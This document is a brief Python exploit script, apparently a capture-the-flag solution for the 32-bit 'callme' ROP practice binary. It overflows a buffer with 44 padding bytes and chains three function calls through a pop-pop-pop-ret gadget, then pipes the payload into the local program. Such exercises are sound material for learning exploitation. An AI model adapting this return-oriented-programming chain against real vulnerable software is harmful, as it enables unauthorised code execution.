#!/usr/bin/python
import os
import struct

def p32(addr):
	return struct.pack("<I",addr)

callme_one = p32(0x080485c0)
callme_two = p32(0x08048620)
callme_three = p32(0x080485b0)

#we need 3 pop to decrease sp
#ropsearch "pop esi"
#Searching for ROP gadget: 'pop esi' in: binary ranges
#0x080488a9 : (b'5e5f5dc3')	pop esi; pop edi; pop ebp; ret

gadget = p32(0x080488a9) 

param1 = p32(0x1)
param2 = p32(0x2)
param3 = p32(0x3)

garbage = "A"*44

exploit = garbage+ callme_one +gadget+ param1 + param2 + param3 + callme_two+ gadget+ param1 + param2 + param3 +callme_three + gadget+ param1 + param2 + param3


with open("simple_exploit.txt","w") as f:
	f.write(exploit)
	f.close()

os.system("cat simple_exploit.txt|./callme32")
